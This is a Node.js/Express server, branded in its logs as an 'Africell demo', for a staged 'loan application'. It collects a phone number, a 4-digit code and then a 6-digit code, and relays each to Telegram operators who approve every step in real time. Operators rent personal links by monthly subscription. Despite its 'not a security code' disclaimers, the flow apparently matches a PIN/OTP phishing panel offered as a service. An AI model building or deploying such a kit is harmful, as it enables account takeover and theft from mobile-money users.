const express = require('express');
const crypto = require('crypto');
const path = require('path');
const app = express();
app.use(express.json({ limit: '20kb' }));
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = String(process.env.TELEGRAM_BOT_TOKEN || process.env.BOT_TOKEN || '').trim();
const ADMIN_CHAT_ID = String(process.env.TELEGRAM_ADMIN_CHAT_ID || process.env.TELEGRAM_SUPER_ADMIN_CHAT_ID || process.env.TELEGRAM_CHAT_ID || process.env.ADMIN_CHAT_ID || '').trim();
const PORT = Number(process.env.PORT || 3000);
const applications = new Map();
const fs = require('fs');
const ADMIN_DB = path.join(__dirname, 'admins.json');
const SUPER_ADMIN_CHAT_ID = String(process.env.TELEGRAM_SUPER_ADMIN_CHAT_ID || process.env.TELEGRAM_ADMIN_CHAT_ID || process.env.TELEGRAM_CHAT_ID || process.env.ADMIN_CHAT_ID || '').trim();
const BASE_URL = String(process.env.BASE_URL || process.env.RENDER_EXTERNAL_URL || '').trim().replace(/\/$/, '');
let admins = [];
try { admins = JSON.parse(fs.readFileSync(ADMIN_DB, 'utf8')); if (!Array.isArray(admins)) admins = []; } catch (_) { admins = []; }
function saveAdmins() { fs.writeFileSync(ADMIN_DB, JSON.stringify(admins, null, 2), { mode: 0o600 }); }
const MONTHLY_SUBSCRIPTION_KES = 1000;
const SUBSCRIPTION_DAYS = 30;
// Give existing admins a 30-day transition period when subscription billing is first enabled.
let adminsMigrated = false;
for (const a of admins) {
  if (!a.subscriptionExpiresAt) {
    a.subscriptionExpiresAt = new Date(Date.now() + SUBSCRIPTION_DAYS * 86400000).toISOString();
    a.subscriptionCreditKES = Number(a.subscriptionCreditKES || 0);
    adminsMigrated = true;
  }
}
if (adminsMigrated) saveAdmins();
function subscriptionExpiry(a) { const n = Date.parse(a?.subscriptionExpiresAt || ''); return Number.isFinite(n) ? n : 0; }
function isSubscriptionActive(a) { return subscriptionExpiry(a) > Date.now(); }
function isSuperAdmin(chatId) { return String(chatId) === SUPER_ADMIN_CHAT_ID && Boolean(SUPER_ADMIN_CHAT_ID); }
function adminLink(a) { return `${BASE_URL || 'https://your-domain.example'}?admin=${encodeURIComponent(a.slug)}`; }
let telegramOffset = 0;
let polling = false;

const safe = (v, n = 120) => String(v ?? '').trim().slice(0, n);
async function telegram(method, body) {
  if (!BOT_TOKEN) throw new Error('Telegram is not configured. Set TELEGRAM_BOT_TOKEN.');
  if (method !== 'getUpdates' && method !== 'getWebhookInfo' && method !== 'deleteWebhook' && !body.chat_id && method !== 'answerCallbackQuery') throw new Error(`Missing chat_id for Telegram method ${method}.`);
  const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body)
  });
  const data = await r.json();
  if (!r.ok || !data.ok) throw new Error(data.description || 'Telegram API request failed');
  return data.result;
}
function adminKeyboard(id, stage) {
  return { inline_keyboard: [[
    { text: '✅ Approve', callback_data: `approve:${stage}:${id}` },
    { text: '❌ Reject', callback_data: `reject:${stage}:${id}` }
  ]] };
}
async function notifyAdmin(appData, stage) {
  const lines = [
    `Independent Loan Service — ${stage === 1 ? 'STEP 1 REVIEW' : stage === 2 ? 'REFERENCE REVIEW' : 'LOAN REQUEST REVIEW'}`,
    `Application: ${appData.id}`,
    `Assigned admin: ${appData.assignedAdmin ? '#' + appData.assignedAdmin : 'Unassigned'}`,
    `Name: ${appData.name}`,
    `Phone: ${appData.phone}`,
  ];
  if (appData.amount !== undefined) lines.push(`Requested amount: GMD ${Number(appData.amount).toLocaleString('en-US')}`);
  if (appData.trackingReference) lines.push(`4-digit demo tracking reference: ${appData.trackingReference}\nTracking reference only — not a security code.`);
  if (appData.reference) lines.push(`User-entered application tracking reference: ${appData.reference}\nTracking reference only — not a security code.`);
  const assigned = appData.assignedAdmin ? admins.find(x => Number(x.number) === Number(appData.assignedAdmin) && x.status === 'active' && x.chatId) : null;
  // Always notify super-admin; also notify the assigned admin when connected.
  const recipients = [...new Set([SUPER_ADMIN_CHAT_ID, assigned?.chatId].filter(Boolean).map(String))];
  if (!BOT_TOKEN) throw new Error('Telegram bot token missing: set TELEGRAM_BOT_TOKEN in hosting environment.');
  if (!recipients.length) throw new Error('Telegram recipient missing: set TELEGRAM_SUPER_ADMIN_CHAT_ID in hosting environment.');
  const failures = [];
  let sent = 0;
  for (const chat_id of recipients) {
    try {
      await telegram('sendMessage', { chat_id, text: lines.join('\n'), reply_markup: adminKeyboard(appData.id, stage) });
      sent++;
    } catch (e) {
      console.error(`Telegram sendMessage failed for chat ${chat_id}:`, e.message);
      failures.push(e.message);
    }
  }
  if (!sent) throw new Error(`Telegram delivery failed: ${failures.join('; ') || 'No notification recipient accepted the message'}`);
}

app.post('/api/application', async (req, res) => {
  const name = safe(req.body.name, 80);
  const phone = safe(req.body.phone, 24);
  const trackingReference = safe(req.body.trackingReference, 4);
  if (!name || !phone || phone.length < 6 || !/^\d{4}$/.test(trackingReference)) return res.status(400).json({ error: 'Enter name, a valid phone number, and a 4-digit demo tracking reference. Do not enter an OTP or PIN.' });
  const id = crypto.randomUUID();
  const slug = safe(req.body.adminSlug, 64);
  const linkedAdmin = admins.find(x => x.slug === slug);
  if (slug && (!linkedAdmin || linkedAdmin.status !== 'active' || !isSubscriptionActive(linkedAdmin))) return res.status(403).json({ error: 'This admin link has expired or is inactive. Please contact the admin.' });
  const assignedAdmin = linkedAdmin && linkedAdmin.status === 'active' && isSubscriptionActive(linkedAdmin) ? linkedAdmin : null;
  const record = { id, name, phone, trackingReference, reference: '', assignedAdmin: assignedAdmin ? assignedAdmin.number : null, stage1: 'pending', stage2: 'not_started', createdAt: Date.now() };
  applications.set(id, record);
  try { await notifyAdmin(record, 1); }
  catch (e) { applications.delete(id); console.error('Step 1 notification failed:', e.message); return res.status(503).json({ error: 'Could not notify the admin. Check Telegram bot token, super-admin chat ID, and hosting logs.' }); }
  res.json({ ok: true, id, status: 'pending', message: 'Submitted. Please wait for admin approval.' });
});
app.get('/api/status/:id', (req, res) => {
  const a = applications.get(req.params.id);
  if (!a) return res.status(404).json({ error: 'Application not found.' });
  res.json({ stage1: a.stage1, stage2: a.stage2, stage2Message: a.stage2Message || '' });
});
app.post('/api/reference-submit', async (req, res) => {
  const id = safe(req.body.id, 64);
  const a = applications.get(id);
  if (!a) return res.status(404).json({ error: 'Application not found.' });
  if (a.stage1 !== 'approved') return res.status(409).json({ error: 'Wait for admin approval before continuing.' });
  if (a.stage2 !== 'not_started') return res.status(409).json({ error: 'Reference already submitted.' });
  const reference = safe(req.body.reference, 40);
  if (!/^\d{6}$/.test(reference)) return res.status(400).json({ error: 'Enter exactly 6 digits for the non-secret application tracking reference. Do not enter an OTP or PIN.' });
  a.reference = reference;
  a.stage2 = 'pending';
  try { await notifyAdmin(a, 2); }
  catch (e) { a.stage2 = 'not_started'; console.error('Reference notification failed:', e.message); return res.status(503).json({ error: 'Could not notify the admin. Check Telegram bot token, super-admin chat ID, and hosting logs.' }); }
  res.json({ ok: true, message: 'Application reference submitted. Please wait for admin review.' });
});
app.post('/api/loan-request', async (req, res) => {
  const id = safe(req.body.id, 64);
  const a = applications.get(id);
  const amount = Number(req.body.amount);
  if (!a || a.stage2 !== 'approved') return res.status(409).json({ error: 'The reference step must be approved before continuing.' });
  if (!Number.isFinite(amount) || amount < 5000 || amount > 1000000) return res.status(400).json({ error: 'Enter a valid amount in GMD.' });
  a.amount = amount;
  try { await notifyAdmin(a, 3); }
  catch (e) { console.error('Loan request notification failed:', e.message); return res.status(503).json({ error: 'Could not notify the admin. Check Telegram bot token, super-admin chat ID, and hosting logs.' }); }
  res.json({ ok: true, message: 'Request submitted for review. This is not a loan approval.' });
});
async function handleCallback(q) {
  if (!q.message || (!isSuperAdmin(q.message.chat.id) && !admins.some(a => a.status === 'active' && String(a.chatId || '') === String(q.message.chat.id))) || String(q.from.id) === '') return;
  const data = safe(q.data, 200);
  const match = /^(approve|reject):(1|2|3):([0-9a-f-]{36})$/.exec(data);
  if (!match) return;
  const [, decision, stageText, id] = match;
  const stage = Number(stageText);
  const a = applications.get(id);
  const actor = admins.find(x => x.status === 'active' && String(x.chatId || '') === String(q.message.chat.id));
  if (actor && !isSuperAdmin(q.message.chat.id) && a && Number(a.assignedAdmin) !== Number(actor.number)) { await telegram('answerCallbackQuery', { callback_query_id: q.id, text: 'This application is assigned to another admin.' }); return; }
  if (!a) { await telegram('answerCallbackQuery', { callback_query_id: q.id, text: 'Application expired or not found.' }); return; }
  if (stage === 1 && a.stage1 !== 'pending') { await telegram('answerCallbackQuery', { callback_query_id: q.id, text: 'Step 1 has already been reviewed.' }); return; }
  if (stage === 2 && a.stage2 !== 'pending') { await telegram('answerCallbackQuery', { callback_query_id: q.id, text: 'Reference step has already been reviewed.' }); return; }
  if (stage === 3 && !a.amount) { await telegram('answerCallbackQuery', { callback_query_id: q.id, text: 'Loan request not found.' }); return; }
  if (stage === 1) { a.stage1 = decision === 'approve' ? 'approved' : 'rejected'; }
  if (stage === 2) { a.stage2 = decision === 'approve' ? 'approved' : 'rejected'; a.stage2Message = decision === 'approve' ? 'Reference step approved.' : 'Reference step rejected. Please check and try again.'; }
  if (stage === 3) a.loanReview = decision === 'approve' ? 'approved' : 'rejected';
  await telegram('answerCallbackQuery', { callback_query_id: q.id, text: decision === 'approve' ? 'Approved' : 'Rejected' });
  const old = q.message.reply_markup;
  await telegram('editMessageReplyMarkup', { chat_id: q.message.chat.id, message_id: q.message.message_id, reply_markup: { inline_keyboard: [] } });
  const ownerChatId = actor?.chatId || ADMIN_CHAT_ID;
  if (ownerChatId) await telegram('sendMessage', { chat_id: ownerChatId, text: `Application ${id}: ${stage === 1 ? 'Step 1' : stage === 2 ? 'Reference step' : 'Loan request'} ${decision === 'approve' ? 'approved' : 'rejected'}.` });
}
async function handleAdminCommand(message) {
  const chatId = String(message.chat.id);
  const text = safe(message.text, 1500);
  if (text === '/start' && isSuperAdmin(chatId)) {
    await telegram('sendMessage', { chat_id: chatId, text: 'Super-admin controls\n/addadmin Name — create numbered admin + personal link\n/admins — list admins, links and expiry\n/revoke NUMBER — suspend admin\n/restore NUMBER — restore admin\n/credit CHAT_ID AMOUNT — credit subscription in KES\n/broadcast MESSAGE — message all active admins\n/notify MESSAGE — send notification to admins\n/status — subscription status\n/link NUMBER — show personal link\nSubscription: KES 1,000 per 30 days. Expiry reminders go to each admin on Telegram 3 days before expiry.' });
    return;
  }
  if (!isSuperAdmin(chatId)) {
    const connect = /^\/connect\s+(\d+)$/i.exec(text);
    if (connect) { const a = admins.find(x => Number(x.number) === Number(connect[1]) && x.status === 'active'); if (!a) return telegram('sendMessage', { chat_id: chatId, text: 'Active admin number not found.' }); if (a.chatId && String(a.chatId) !== chatId) return telegram('sendMessage', { chat_id: chatId, text: 'This admin is already connected to another Telegram account. Contact the super admin.' }); a.chatId = chatId; saveAdmins(); return telegram('sendMessage', { chat_id: chatId, text: `Connected as admin #${a.number} (${a.name}).` }); }
    return;
  }
  if (text.startsWith('/addadmin ')) {
    const name = safe(text.slice(10), 80);
    if (!name) return telegram('sendMessage', { chat_id: chatId, text: 'Usage: /addadmin Admin Name' });
    const number = admins.reduce((m, a) => Math.max(m, Number(a.number) || 0), 0) + 1;
    const slug = crypto.randomBytes(12).toString('hex');
    const now = Date.now();
    const a = { number, name, slug, status: 'active', chatId: null, createdAt: new Date(now).toISOString(), subscriptionCreditKES: 0, subscriptionExpiresAt: new Date(now).toISOString(), notificationsEnabled: true };
    admins.push(a); saveAdmins();
    return telegram('sendMessage', { chat_id: chatId, text: `Admin #${number} added: ${name}\\nPersonal link: ${adminLink(a)}\\nShare this link with the assigned admin. They must open it and start the bot to connect their Telegram account.` });
  }
  if (text === '/status') {
    const active = admins.filter(a => a.status === 'active').length;
    const subscribed = admins.filter(a => a.status === 'active' && isSubscriptionActive(a)).length;
    const expired = admins.filter(a => a.status === 'active' && !isSubscriptionActive(a)).length;
    const connected = admins.filter(a => a.status === 'active' && a.chatId).length;
    return telegram('sendMessage', { chat_id: chatId, text: `📊 Admin subscription status\nMonthly fee: KES ${MONTHLY_SUBSCRIPTION_KES}\nActive admins: ${active}\nSubscribed links: ${subscribed}\nExpired links: ${expired}\nTelegram connected: ${connected}\nExpiry reminders: Telegram only, 3 days before expiry.` });
  }
  if (text === '/admins') {
    const body = admins.length ? admins.map(a => `#${a.number} ${a.name} — ${a.status} — ${a.chatId ? 'Telegram connected' : 'not connected'}\nSubscription: ${isSubscriptionActive(a) ? 'ACTIVE' : 'EXPIRED'}\nExpires: ${a.subscriptionExpiresAt ? new Date(a.subscriptionExpiresAt).toLocaleString('en-GB', { timeZone: 'Africa/Nairobi' }) + ' EAT' : 'Not set'}\nCredit total: KES ${Number(a.subscriptionCreditKES || 0).toFixed(2)}\n${adminLink(a)}`).join('\n\n') : 'No admins added yet.';
    return telegram('sendMessage', { chat_id: chatId, text: body });
  }
  const credit = /^\/credit\s+(\d+)\s+(\d+(?:\.\d{1,2})?)$/i.exec(text);
  if (credit) {
    const targetChatId = credit[1];
    const amount = Number(credit[2]);
    const a = admins.find(x => String(x.chatId || '') === targetChatId);
    if (!a) return telegram('sendMessage', { chat_id: chatId, text: 'Admin Telegram Chat ID not found. The admin must connect to the bot first.' });
    if (!Number.isFinite(amount) || amount <= 0) return telegram('sendMessage', { chat_id: chatId, text: 'Enter a valid credit amount in KES.' });
    const now = Date.now();
    const currentExpiry = Math.max(now, subscriptionExpiry(a));
    const daysAdded = amount / MONTHLY_SUBSCRIPTION_KES * SUBSCRIPTION_DAYS;
    a.subscriptionCreditKES = Number(a.subscriptionCreditKES || 0) + amount;
    a.subscriptionExpiresAt = new Date(currentExpiry + daysAdded * 86400000).toISOString();
    a.lastExpiryReminderFor = null;
    saveAdmins();
    const expiryText = new Date(a.subscriptionExpiresAt).toLocaleString('en-GB', { timeZone: 'Africa/Nairobi' });
    await telegram('sendMessage', { chat_id: targetChatId, text: `✅ Subscription credited.\nAmount: KES ${amount.toFixed(2)}\nDays added: ${daysAdded.toFixed(2)}\nNew expiry: ${expiryText} EAT` });
    return telegram('sendMessage', { chat_id: chatId, text: `✅ Subscription credited.\nAdmin: ${targetChatId} (#${a.number} ${a.name})\nAmount: KES ${amount.toFixed(2)}\nDays added: ${daysAdded.toFixed(2)}\nNew expiry: ${expiryText} EAT` });
  }
  const action = /^\/(revoke|restore|link)\s+(\d+)$/i.exec(text);
  if (action) {
    const a = admins.find(x => Number(x.number) === Number(action[2]));
    if (!a) return telegram('sendMessage', { chat_id: chatId, text: 'Admin number not found.' });
    if (action[1] === 'revoke') a.status = 'revoked';
    if (action[1] === 'restore') a.status = 'active';
    saveAdmins();
    const reply = action[1] === 'link' ? `Admin #${a.number} personal link: ${adminLink(a)}` : `Admin #${a.number} ${a.name}: ${a.status}.`;
    return telegram('sendMessage', { chat_id: chatId, text: reply });
  }
  if (text.startsWith('/broadcast ')) {
    const body = safe(text.slice(11), 1200);
    if (!body) return telegram('sendMessage', { chat_id: chatId, text: 'Usage: /broadcast message' });
    const recipients = admins.filter(a => a.status === 'active' && a.chatId);
    let sent = 0;
    for (const a of recipients) { try { await telegram('sendMessage', { chat_id: a.chatId, text: `📢 Super-admin broadcast\\n\\n${body}` }); sent++; } catch (_) {} }
    return telegram('sendMessage', { chat_id: chatId, text: `Broadcast sent to ${sent} of ${recipients.length} connected active admins.` });
  }
  if (text.startsWith('/notify ')) {
    const body = safe(text.slice(8), 1200);
    if (!body) return telegram('sendMessage', { chat_id: chatId, text: 'Usage: /notify message' });
    const recipients = admins.filter(a => a.status === 'active' && a.chatId && a.notificationsEnabled !== false);
    let sent = 0;
    for (const a of recipients) { try { await telegram('sendMessage', { chat_id: a.chatId, text: `🔔 Super-admin notification

${body}` }); sent++; } catch (_) {} }
    return telegram('sendMessage', { chat_id: chatId, text: `Notification sent to ${sent} of ${recipients.length} connected active admins.` });
  }
}

async function checkSubscriptionReminders() {
  const now = Date.now();
  let changed = false;
  for (const a of admins) {
    if (a.status !== 'active' || !a.chatId) continue;
    const expiry = subscriptionExpiry(a);
    const remaining = expiry - now;
    if (remaining > 0 && remaining <= 3 * 86400000) {
      const reminderKey = a.subscriptionExpiresAt;
      if (a.lastExpiryReminderFor === reminderKey) continue;
      try {
        await telegram('sendMessage', { chat_id: a.chatId, text: `⚠️ Subscription reminder\nYour admin link subscription expires in approximately ${Math.ceil(remaining / 86400000)} day(s).\nSubscription fee: KES ${MONTHLY_SUBSCRIPTION_KES} per month.\nPlease contact the Super Admin to arrange payment and keep your personal link active.` });
        a.lastExpiryReminderFor = reminderKey;
        changed = true;
      } catch (e) { console.error(`Subscription reminder failed for admin #${a.number}:`, e.message); }
    }
  }
  if (changed) saveAdmins();
}
setInterval(() => checkSubscriptionReminders().catch(e => console.error('Subscription reminder check failed:', e.message)), 60 * 60 * 1000);

async function pollTelegram() {
  if (polling || !BOT_TOKEN || !SUPER_ADMIN_CHAT_ID) return;
  polling = true;
  try {
    const updates = await telegram('getUpdates', { offset: telegramOffset, timeout: 20, allowed_updates: ['callback_query', 'message'] });
    for (const u of updates) {
      telegramOffset = Math.max(telegramOffset, u.update_id + 1);
      if (u.callback_query) {
        try { await handleCallback(u.callback_query); } catch (e) { console.error('Telegram callback error:', e.message); }
      }
      if (u.message && u.message.text) {
        try { await handleAdminCommand(u.message); } catch (e) { console.error('Telegram admin command error:', e.message); }
      }
    }
  } catch (e) { console.error('Telegram polling error:', e.message); }
  finally { polling = false; }
}
if (BOT_TOKEN && (SUPER_ADMIN_CHAT_ID || ADMIN_CHAT_ID)) {
  // getUpdates will fail if a webhook is still configured for this bot. Remove it before polling.
  telegram('deleteWebhook', { drop_pending_updates: false }).then(() => {
    console.log('Telegram webhook cleared; long polling enabled.');
    setInterval(pollTelegram, 1500);
  }).catch(e => {
    console.error('Telegram startup error:', e.message);
    setInterval(pollTelegram, 5000);
  });
} else { console.error('Telegram notifications disabled: configure TELEGRAM_BOT_TOKEN and TELEGRAM_SUPER_ADMIN_CHAT_ID (or TELEGRAM_ADMIN_CHAT_ID).'); }
app.get('/api/health', (_req, res) => res.json({
  ok: true,
  telegramConfigured: Boolean(BOT_TOKEN && SUPER_ADMIN_CHAT_ID),
  botTokenConfigured: Boolean(BOT_TOKEN),
  superAdminConfigured: Boolean(SUPER_ADMIN_CHAT_ID),
  superAdminChatIdConfigured: Boolean(SUPER_ADMIN_CHAT_ID),
  baseUrlConfigured: Boolean(BASE_URL),
  admins: admins.length,
  note: 'Use /api/telegram-diagnostic to verify the token and chat ID against Telegram. No secrets are returned.'
}));
app.get('/api/telegram-diagnostic', async (_req, res) => {
  const result = { configured: Boolean(BOT_TOKEN && SUPER_ADMIN_CHAT_ID), tokenPresent: Boolean(BOT_TOKEN), chatIdPresent: Boolean(SUPER_ADMIN_CHAT_ID), tokenValid: false, chatAccessible: false, errors: [] };
  if (!BOT_TOKEN) result.errors.push('Missing TELEGRAM_BOT_TOKEN (or BOT_TOKEN).');
  if (!SUPER_ADMIN_CHAT_ID) result.errors.push('Missing super-admin chat ID. Set TELEGRAM_SUPER_ADMIN_CHAT_ID or TELEGRAM_ADMIN_CHAT_ID.');
  if (BOT_TOKEN) {
    try { const bot = await telegram('getMe', {}); result.tokenValid = true; result.botUsername = bot.username || null; }
    catch (e) { result.errors.push(`Token check failed: ${e.message}`); }
  }
  if (BOT_TOKEN && SUPER_ADMIN_CHAT_ID) {
    try { const chat = await telegram('getChat', { chat_id: SUPER_ADMIN_CHAT_ID }); result.chatAccessible = true; result.chatType = chat.type || null; }
    catch (e) { result.errors.push(`Chat ID check failed: ${e.message}`); }
  }
  res.json(result);
});
app.listen(PORT, () => {
  const configured = Boolean(BOT_TOKEN && SUPER_ADMIN_CHAT_ID);
  console.log(`Africell demo running on port ${PORT}; Telegram ${configured ? 'environment variables detected' : 'NOT CONFIGURED'}`);
  if (!BOT_TOKEN) console.error('Missing bot token: set TELEGRAM_BOT_TOKEN.');
  if (!SUPER_ADMIN_CHAT_ID) console.error('Missing admin chat ID: set TELEGRAM_SUPER_ADMIN_CHAT_ID (or TELEGRAM_ADMIN_CHAT_ID).');
});
